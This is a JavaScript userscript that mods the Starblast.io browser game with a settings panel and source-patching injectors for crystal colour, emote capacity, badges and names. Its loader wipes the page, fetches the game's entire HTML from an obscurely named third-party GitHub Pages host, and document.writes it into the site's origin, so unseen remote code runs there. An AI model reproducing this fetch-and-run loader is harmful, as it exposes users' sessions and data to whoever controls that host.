(function() {
    'use strict';

    const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");
    
    // Settings object with fallback values
    const settings = {
        crystalColor: '#ffffff',
        emoteCapacity: 4,
        showBlankBadge: false,
        uiVisible: true
    };

    // Load settings from localStorage safely
    function loadSettings() {
        try {
            settings.crystalColor = localStorage.getItem('crystal-color') || '#ffffff';
            settings.emoteCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
            settings.showBlankBadge = localStorage.getItem('show-blank-badge') === 'true';
            settings.uiVisible = localStorage.getItem('ui-visible') !== 'false';
        } catch (e) {
            log("Failed to load settings from localStorage: " + e.message);
        }
    }

    // Save settings to localStorage safely
    function saveSettings() {
        try {
            localStorage.setItem('crystal-color', settings.crystalColor);
            localStorage.setItem('emote-capacity', settings.emoteCapacity.toString());
            localStorage.setItem('show-blank-badge', settings.showBlankBadge.toString());
            localStorage.setItem('ui-visible', settings.uiVisible.toString());
        } catch (e) {
            log("Failed to save settings to localStorage: " + e.message);
        }
    }

    // Wait for DOM to be ready
    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 100);
        }
    }

    // Create UI Panel
    function createUI() {
        // Ensure body exists before creating UI
        if (!document.body) {
            log("Document body not ready, retrying...");
            setTimeout(createUI, 100);
            return;
        }

        // Remove existing panel if it exists
        const existingPanel = document.getElementById('starblast-mod-panel');
        if (existingPanel) {
            existingPanel.remove();
        }

        const panel = document.createElement('div');
        panel.id = 'starblast-mod-panel';
        panel.style.cssText = `
            position: fixed;
            top: 10px;
            left: 10px;
            width: 300px;
            background: rgba(20, 20, 20, 0.95);
            border: 2px solid #06c26d;
            border-radius: 10px;
            padding: 15px;
            font-family: Arial, sans-serif;
            font-size: 12px;
            color: #ffffff;
            z-index: 10000;
            box-shadow: 0 0 20px rgba(6, 194, 109, 0.3);
            backdrop-filter: blur(5px);
            display: ${settings.uiVisible ? 'block' : 'none'};
        `;

        // Build HTML content without template literals in innerHTML
        const headerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h3 style="margin: 0; color: #06c26d;">Starblast Enhanced</h3>
                <button id="minimize-btn" style="background: #06c26d; border: none; color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer;">−</button>
            </div>
        `;

        const contentHTML = `
            <div id="panel-content">
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px;">Crystal Color:</label>
                    <input type="color" id="crystal-color" style="width: 100%; height: 35px; border: none; border-radius: 5px; cursor: pointer;">
                </div>
                
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px;">Emote Capacity: <span id="emote-value">${settings.emoteCapacity}</span></label>
                    <input type="range" id="emote-capacity" min="1" max="10" 
                           style="width: 100%; background: #333; outline: none; cursor: pointer;">
                </div>
                
                <div style="margin-bottom: 15px;">
                    <label style="display: flex; align-items: center; cursor: pointer;">
                        <input type="checkbox" id="show-blank-badge" 
                               style="margin-right: 10px; transform: scale(1.2);">
                        Show Blank Badges
                    </label>
                </div>
                
                <div style="text-align: center; margin-top: 15px; padding-top: 15px; border-top: 1px solid #333;">
                    <small style="color: #888;">Lowercase names enabled by default</small>
                </div>
            </div>
        `;

        panel.innerHTML = headerHTML + contentHTML;

        try {
            document.body.appendChild(panel);
            log("UI panel created successfully");
        } catch (e) {
            log("Failed to append panel to body: " + e.message);
            return;
        }

        // Set initial values after DOM elements are created
        const colorInput = document.getElementById('crystal-color');
        const rangeInput = document.getElementById('emote-capacity');
        const checkboxInput = document.getElementById('show-blank-badge');

        if (colorInput) colorInput.value = settings.crystalColor;
        if (rangeInput) rangeInput.value = settings.emoteCapacity;
        if (checkboxInput) checkboxInput.checked = settings.showBlankBadge;

        // Add event listeners with error handling
        try {
            const minimizeBtn = document.getElementById('minimize-btn');
            if (minimizeBtn) {
                minimizeBtn.addEventListener('click', () => {
                    const content = document.getElementById('panel-content');
                    if (content) {
                        if (content.style.display === 'none') {
                            content.style.display = 'block';
                            minimizeBtn.textContent = '−';
                            settings.uiVisible = true;
                        } else {
                            content.style.display = 'none';
                            minimizeBtn.textContent = '+';
                            settings.uiVisible = false;
                        }
                        saveSettings();
                    }
                });
            }

            if (colorInput) {
                colorInput.addEventListener('change', (e) => {
                    settings.crystalColor = e.target.value;
                    saveSettings();
                    log(`Crystal color changed to ${settings.crystalColor}`);
                });
            }

            if (rangeInput) {
                rangeInput.addEventListener('input', (e) => {
                    settings.emoteCapacity = parseInt(e.target.value);
                    const valueSpan = document.getElementById('emote-value');
                    if (valueSpan) valueSpan.textContent = settings.emoteCapacity;
                    saveSettings();
                    log(`Emote capacity changed to ${settings.emoteCapacity}`);
                });
            }

            if (checkboxInput) {
                checkboxInput.addEventListener('change', (e) => {
                    settings.showBlankBadge = e.target.checked;
                    saveSettings();
                    log(`Show blank badges: ${settings.showBlankBadge}`);
                });
            }
        } catch (e) {
            log("Failed to attach event listeners: " + e.message);
        }

        // Make panel draggable
        makePanelDraggable(panel);
    }

    function makePanelDraggable(panel) {
        let isDragging = false;
        let dragOffset = { x: 0, y: 0 };

        panel.addEventListener('mousedown', (e) => {
            if (e.target.id === 'minimize-btn' || 
                e.target.type === 'color' || 
                e.target.type === 'range' || 
                e.target.type === 'checkbox') return;
            
            isDragging = true;
            dragOffset.x = e.clientX - panel.offsetLeft;
            dragOffset.y = e.clientY - panel.offsetTop;
            panel.style.cursor = 'grabbing';
        });

        document.addEventListener('mousemove', (e) => {
            if (!isDragging) return;
            panel.style.left = (e.clientX - dragOffset.x) + 'px';
            panel.style.top = (e.clientY - dragOffset.y) + 'px';
        });

        document.addEventListener('mouseup', () => {
            isDragging = false;
            panel.style.cursor = 'default';
        });
    }

    // Code injection functions (unchanged)
    function injectCrystalColorChanger(src) {
        const crystalCode = `
            let CrystalObject;
            for (let i in window) try {
                let val = window[i];
                if ("function" == typeof val.prototype.createModel && val.prototype.createModel.toString().includes("Crystal")) {
                    CrystalObject = val;
                    break;
                }
            } catch (e) {}

            if (CrystalObject) {
                let oldModel = CrystalObject.prototype.getModelInstance;
                CrystalObject.prototype.getModelInstance = function () {
                    let res = oldModel.apply(this, arguments);
                    let color = localStorage.getItem("crystal-color") || "#ffffff";
                    if (color && this.material && this.material.color) {
                        this.material.color.set(color);
                    }
                    return res;
                };
            }
        `;
        return src + crystalCode;
    }

    function injectEmoteCapacityChanger(src) {
        const emoteCode = `
            setTimeout(() => {
                if (window.ChatPanel) {
                    let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/);
                    if (globalVal) {
                        globalVal = globalVal[0];
                        ChatPanel.prototype.getEmotesCapacity = function () {
                            let num = parseInt(localStorage.getItem("emote-capacity")) || 4;
                            try { 
                                return Math.trunc(Math.min(Math.max(1, num), 10)) || 4;
                            } catch (e) { 
                                return 4;
                            }
                        };
                        ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
                    }
                }
            }, 1000);
        `;
        return src + emoteCode;
    }

    function injectBlankBadgeToggle(src) {
        const badgeCode = `
            setTimeout(() => {
                let pattern = /,(\\s*"blank"\\s*!={1,2}\\s*this\\.custom\\.badge)/;
                let found = false;
                
                for (let i in window) try {
                    let val = window[i].prototype;
                    for (let j in val) {
                        let func = val[j];
                        if ("function" == typeof func && func.toString().match(pattern)) {
                            val[j] = Function("return " + func.toString().replace(pattern, ", (localStorage.getItem('show-blank-badge') === 'true') || $1"))();
                            found = true;
                            if (val.drawIcon) {
                                val.drawIcon = Function("return " + val.drawIcon.toString().replace(/}\\s*else\\s*{/, '} else if (this.icon !== "blank") {'))();
                            }
                            let gl = window[i];
                            for (let k in gl) {
                                if ("function" == typeof gl[k] && gl[k].toString().includes(".table")) {
                                    let oldF = gl[k];
                                    gl[k] = function () {
                                        let current = localStorage.getItem('show-blank-badge') === 'true';
                                        if (this.showBlank !== current) {
                                            for (let i in this.table) if (i.startsWith("blank")) delete this.table[i];
                                            this.showBlank = current;
                                        }
                                        return oldF.apply(this, arguments);
                                    };
                                    break;
                                }
                            }
                        }
                    }
                } catch (e) {}
            }, 1500);
        `;
        return src + badgeCode;
    }

    function injectLowercaseNames(src) {
        const lowercaseCode = `
            let g = setInterval(function () {
                try {
                    let playerInput = document.querySelector(".player-app, #player input");
                    if (playerInput) {
                        playerInput.style.textTransform = "none";
                        clearInterval(g);
                    }
                } catch (e) {}
            }, 100);

            setTimeout(() => {
                try {
                    let x = Object.values(Object.values(module.exports.settings).find(v => v && v.mode)).find(v => v && "function" == typeof v.startModdingMode);
                    if (x && x.startGame) {
                        x.startGame = Function("return " + x.startGame.toString().replace(/\\.toUpperCase\\(\\)/g, ""))();
                    }
                } catch (e) {}
            }, 2000);
        `;
        return src + lowercaseCode;
    }

    function injectCorrectNames(src) {
        const namesCode = `
            setTimeout(() => {
                try {
                    if (window.Names && Names.prototype.set) {
                        let oldNameSet = Names.prototype.set.toString();
                        let customVal = oldNameSet.match(/=\\s*(\\w+)\\.custom/);
                        if (customVal) {
                            customVal = customVal[1];
                            let a = oldNameSet.match(/\\w+\\s*={2,3}\\s*this\\.(\\w+)\\.[^&]+/);
                            if (a) {
                                let globalVal = a[1];
                                let condition = a[0];
                                Names.prototype.set = Function("return " + oldNameSet.replace(/return\\s+[^]+?\\)/, "return " + condition + " ? (this." + globalVal + ".player_name = " + customVal + ".player_name, Object.values(this." + globalVal + ").find(function(a) { return a && a.additional_badges }).custom = " + customVal + ".custom || {})"))();
                            }
                        }
                    }
                } catch (e) {}
            }, 2500);
        `;
        return src + namesCode;
    }

    // Main injection function
    function codeInjector(src) {
        log("Injecting enhanced features...");
        
        try {
            src = injectCrystalColorChanger(src);
            src = injectEmoteCapacityChanger(src);
            src = injectBlankBadgeToggle(src);
            src = injectLowercaseNames(src);
            src = injectCorrectNames(src);
            
            log("All features injected successfully");
        } catch (e) {
            log("Error during code injection: " + e.message);
        }
        
        return src;
    }

    // Initialize the mod system
    function initializeMod() {
        log("Initializing enhanced mod...");
        
        // Load settings first
        loadSettings();
        
        // Initialize the code injectors array if it doesn't exist
        if (!window.sbCodeInjectors) {
            window.sbCodeInjectors = [];
        }
        
        // Add our code injector
        window.sbCodeInjectors.push(codeInjector);
        
        // Create UI when DOM is ready
        waitForDOM(createUI);
        
        log("Enhanced mod initialized");
    }

    // Main code injection logic
    function injectLoader() {
        if (window.location.pathname !== "/") {
            log("Injection not needed - not on main page");
            return;
        }

        log("Starting game injection process...");

        // Clear the document safely
        try {
            document.open();
            document.write('<html><head><title>Loading...</title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;">Loading Starblast Enhanced...</h1></div></body></html>');
            document.close();
        } catch (e) {
            log("Failed to clear document: " + e.message);
        }

        const url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sısm1sösm2k1.html';
        const xhr = new XMLHttpRequest();
        
        log("Fetching custom source...");
        xhr.open("GET", url + '?_=' + new Date().getTime());
        
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    let starSRC = xhr.responseText;

                    if (starSRC && starSRC.trim() !== "") {
                        log("Source fetched successfully");
                        const start_time = performance.now();
                        log("Applying mods...");

                        if (!window.sbCodeInjectors || window.sbCodeInjectors.length === 0) {
                            log("No Starblast.io userscripts found to load");
                        } else {
                            let error_notified = false;
                            for (const injector of window.sbCodeInjectors) {
                                try {
                                    if (typeof injector === "function") {
                                        starSRC = injector(starSRC);
                                    } else {
                                        log("Injector was not a function");
                                        console.log(injector);
                                    }
                                } catch (error) {
                                    if (!error_notified) {
                                        alert("One of your Starblast.io userscripts failed to load");
                                        error_notified = true;
                                    }
                                    console.error("Injector error:", error);
                                }
                            }
                        }

                        const end_time = performance.now();
                        log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);

                        // Apply the modified source to the document
                        try {
                            document.open();
                            document.write(starSRC);
                            document.close();
                            log("Game loaded successfully");
                        } catch (e) {
                            log("Failed to write modified source: " + e.message);
                        }
                    } else {
                        log("Source fetch returned empty content");
                        alert("Failed to load game: Empty response");
                    }
                } else {
                    log(`Source fetch failed with status: ${xhr.status}`);
                    alert(`Failed to load game: HTTP ${xhr.status}`);
                }
            }
        };

        xhr.onerror = function() {
            log("Network error while fetching source");
            alert("Network error: Could not load game");
        };

        xhr.send();
    }

    // Start the mod with proper error handling
    try {
        initializeMod();
        // Delay injection to ensure everything is properly initialized
        setTimeout(injectLoader, 100);
    } catch (e) {
        console.error("Failed to start Starblast Enhanced mod:", e);
    }

})();
